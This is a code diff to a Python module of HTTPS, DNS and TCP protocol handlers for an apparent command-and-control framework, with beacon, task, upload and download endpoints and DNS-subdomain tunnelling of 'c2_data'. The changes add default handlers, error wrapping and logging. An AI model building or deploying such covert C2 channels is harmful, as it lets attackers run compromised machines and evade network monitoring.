@@ -21,8 +21,6 @@ except ImportError:
     aiohttp = None
     HAS_AIOHTTP = False
 
-logger = logging.getLogger(__name__)
-
 
 class BaseProtocol:
     """Base class for all communication protocols."""
@@ -35,11 +33,27 @@ class BaseProtocol:
         self.connected = False
         self.connection_count = 0
 
-        # Event handlers
-        self.on_connection = None
-        self.on_message = None
-        self.on_disconnection = None
-        self.on_error = None
+        # Event handlers (initialize as no-op async functions)
+        self.on_connection = self._default_on_connection
+        self.on_message = self._default_on_message
+        self.on_disconnection = self._default_on_disconnection
+        self.on_error = self._default_on_error
+
+    async def _default_on_connection(self, connection_info: Dict[str, Any]):
+        """Default no-op connection handler."""
+        self.logger.debug(f"Default connection handler called with: {connection_info}")
+
+    async def _default_on_message(self, session_id: str, message: Dict[str, Any]):
+        """Default no-op message handler."""
+        self.logger.debug(f"Default message handler for session {session_id}: {message}")
+
+    async def _default_on_disconnection(self, session_id: str):
+        """Default no-op disconnection handler."""
+        self.logger.debug(f"Default disconnection handler for session: {session_id}")
+
+    async def _default_on_error(self, protocol: str, error: Exception):
+        """Default no-op error handler."""
+        self.logger.warning(f"Default error handler for protocol {protocol}: {error}")
 
     async def start(self):
         """Start the protocol handler."""
@@ -51,7 +65,8 @@ class BaseProtocol:
 
     async def send_message(self, message: Dict[str, Any]) -> Optional[Dict[str, Any]]:
         """Send message through the protocol."""
-        raise NotImplementedError
+        self.logger.debug(f"Send message called with: {message}")
+        raise NotImplementedError(f"Subclasses must implement send_message. Message: {message.get('type', 'unknown')}")
 
     async def connect(self) -> bool:
         """Establish connection (client-side)."""
@@ -221,12 +236,14 @@ class HttpsProtocol(BaseProtocol):
             self.connection_count += 1
             self.logger.debug(f"Reader stream ready: {reader is not None}")
 
-            if self.on_connection and callable(self.on_connection):
+            try:
                 await self.on_connection({
                     'remote_addr': client_addr,
                     'protocol': 'https',
                     'timestamp': time.time()
                 })
+            except Exception as e:
+                self.logger.error(f"on_connection callback error: {e}")
 
         except Exception as e:
             self.logger.error(f"Error handling client connection: {e}")
@@ -234,13 +251,16 @@ class HttpsProtocol(BaseProtocol):
     async def _handle_beacon(self, request):
         """Handle beacon endpoint."""
         try:
+            self.logger.debug(f"Processing beacon request from {getattr(request, 'remote', 'unknown')}")
             encrypted_data = await request.read()
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            if self.on_message and callable(self.on_message):
-                session_id = message.get('session_id', 'unknown')
+            session_id = message.get('session_id', 'unknown')
+            try:
                 await self.on_message(session_id, message)
+            except Exception as e:
+                self.logger.error(f"on_message callback error: {e}")
 
             # Send response
             response = {'status': 'success', 'timestamp': time.time()}
@@ -255,13 +275,16 @@ class HttpsProtocol(BaseProtocol):
     async def _handle_task(self, request):
         """Handle task endpoint."""
         try:
+            self.logger.debug(f"Processing task request from {getattr(request, 'remote', 'unknown')}")
             encrypted_data = await request.read()
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            if self.on_message and callable(self.on_message):
-                session_id = message.get('session_id', 'unknown')
+            session_id = message.get('session_id', 'unknown')
+            try:
                 await self.on_message(session_id, message)
+            except Exception as e:
+                self.logger.error(f"on_message callback error: {e}")
 
             response = {'status': 'success', 'timestamp': time.time()}
             encrypted_response = self.encryption_manager.encrypt(json.dumps(response))
@@ -275,13 +298,16 @@ class HttpsProtocol(BaseProtocol):
     async def _handle_upload(self, request):
         """Handle file upload endpoint."""
         try:
+            self.logger.debug(f"Processing upload request from {getattr(request, 'remote', 'unknown')}")
             encrypted_data = await request.read()
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            if self.on_message and callable(self.on_message):
-                session_id = message.get('session_id', 'unknown')
+            session_id = message.get('session_id', 'unknown')
+            try:
                 await self.on_message(session_id, message)
+            except Exception as e:
+                self.logger.error(f"on_message callback error: {e}")
 
             response = {'status': 'success', 'timestamp': time.time()}
             encrypted_response = self.encryption_manager.encrypt(json.dumps(response))
@@ -295,13 +321,16 @@ class HttpsProtocol(BaseProtocol):
     async def _handle_download(self, request):
         """Handle file download endpoint."""
         try:
+            self.logger.debug(f"Processing download request from {getattr(request, 'remote', 'unknown')}")
             encrypted_data = await request.read()
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            if self.on_message and callable(self.on_message):
-                session_id = message.get('session_id', 'unknown')
+            session_id = message.get('session_id', 'unknown')
+            try:
                 await self.on_message(session_id, message)
+            except Exception as e:
+                self.logger.error(f"on_message callback error: {e}")
 
             response = {'status': 'success', 'timestamp': time.time()}
             encrypted_response = self.encryption_manager.encrypt(json.dumps(response))
@@ -373,6 +402,7 @@ class DnsProtocol(BaseProtocol):
             response, addr = self.socket.recvfrom(1024)
             if response:
                 self.connected = True
+                self.logger.debug(f"DNS connection established with {addr}")
                 return True
 
         except Exception as e:
@@ -406,7 +436,11 @@ class DnsProtocol(BaseProtocol):
 
                 if response:
                     parsed_response = self._parse_dns_response(response)
-                    responses.append(parsed_response)
+                    response_data = {
+                        'data': parsed_response,
+                        'source_addr': addr
+                    }
+                    responses.append(response_data)
 
             # Combine responses
             if responses:
@@ -472,7 +506,7 @@ class DnsProtocol(BaseProtocol):
             header = struct.unpack('!HHHHHH', response[:12])
             transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs = header
 
-            self.logger.debug(f"DNS Response - ID: {transaction_id}, Answers: {answer_rrs}")
+            self.logger.debug(f"DNS Response - ID: {transaction_id}, Flags: {flags:04x}, Answers: {answer_rrs}, Authority: {authority_rrs}, Additional: {additional_rrs}")
 
             if answer_rrs == 0:
                 self.logger.debug("No answers in DNS response")
@@ -527,6 +561,7 @@ class DnsProtocol(BaseProtocol):
 
                 # Parse TYPE, CLASS, TTL, RDLENGTH
                 rr_type, rr_class, ttl, rdlength = struct.unpack('!HHIH', response[offset:offset+10])
+                self.logger.debug(f"RR - Type: {rr_type}, Class: {rr_class}, TTL: {ttl}, Length: {rdlength}")
                 offset += 10
 
                 if offset + rdlength > len(response):
@@ -607,7 +642,6 @@ class DnsProtocol(BaseProtocol):
     def _parse_domain_name(self, data: bytes, packet: bytes, offset: int = 0) -> str:
         """Parse domain name from DNS data, handling compression pointers."""
         labels = []
-        original_offset = offset
         jumped = False
 
         try:
@@ -619,7 +653,6 @@ class DnsProtocol(BaseProtocol):
 
                 if length & 0xC0 == 0xC0:  # Compression pointer
                     if not jumped:
-                        original_offset = offset + 2
                         jumped = True
 
                     # Extract pointer offset
@@ -644,9 +677,9 @@ class DnsProtocol(BaseProtocol):
             self.logger.error(f"Error parsing domain name: {e}")
             return ""
 
-    def _combine_dns_responses(self, responses: List[str]) -> str:
+    def _combine_dns_responses(self, responses: List[dict]) -> str:
         """Combine multiple DNS responses into original data."""
-        return ''.join(responses)
+        return ''.join(response.get('data', '') for response in responses if isinstance(response, dict))
 
     async def _dns_handler_loop(self):
         """Main DNS packet handling loop."""
@@ -679,13 +712,16 @@ class DnsProtocol(BaseProtocol):
                 # Extract C2 data from subdomain
                 c2_data = self._extract_c2_data_from_domain(domain)
 
-                if c2_data and self.on_message and callable(self.on_message):
+                if c2_data:
                     # Decrypt and process message
                     try:
                         decrypted = self.encryption_manager.decrypt(base64.b64decode(c2_data))
                         message = json.loads(decrypted)
                         session_id = message.get('session_id', 'unknown')
-                        await self.on_message(session_id, message)
+                        try:
+                            await self.on_message(session_id, message)
+                        except Exception as e:
+                            self.logger.error(f"on_message callback error: {e}")
                     except Exception as e:
                         self.logger.warning(f"Failed to decrypt DNS message: {e}")
 
@@ -906,13 +942,15 @@ class TcpProtocol(BaseProtocol):
             self.client_connections[session_id] = writer
             self.connection_count += 1
 
-            if self.on_connection and callable(self.on_connection):
+            try:
                 await self.on_connection({
                     'session_id': session_id,
                     'remote_addr': client_addr,
                     'protocol': 'tcp',
                     'timestamp': time.time()
                 })
+            except Exception as e:
+                self.logger.error(f"on_connection callback error: {e}")
 
             # Handle messages from this client
             await self._handle_client_messages(reader, writer, session_id)
@@ -941,8 +979,10 @@ class TcpProtocol(BaseProtocol):
                 decrypted = self.encryption_manager.decrypt(encrypted_data)
                 message = json.loads(decrypted)
 
-                if self.on_message and callable(self.on_message):
+                try:
                     await self.on_message(session_id, message)
+                except Exception as e:
+                    self.logger.error(f"on_message callback error: {e}")
 
                 # Send acknowledgment
                 ack = {'status': 'success', 'timestamp': time.time()}
@@ -956,9 +996,13 @@ class TcpProtocol(BaseProtocol):
 
         except asyncio.IncompleteReadError:
             # Client disconnected
-            if self.on_disconnection and callable(self.on_disconnection):
+            try:
                 await self.on_disconnection(session_id)
+            except Exception as e:
+                self.logger.error(f"on_disconnection callback error: {e}")
         except Exception as e:
             self.logger.error(f"Error handling client messages: {e}")
-            if self.on_error and callable(self.on_error):
+            try:
                 await self.on_error('tcp', e)
+            except Exception as ex:
+                self.logger.error(f"on_error callback error: {ex}")
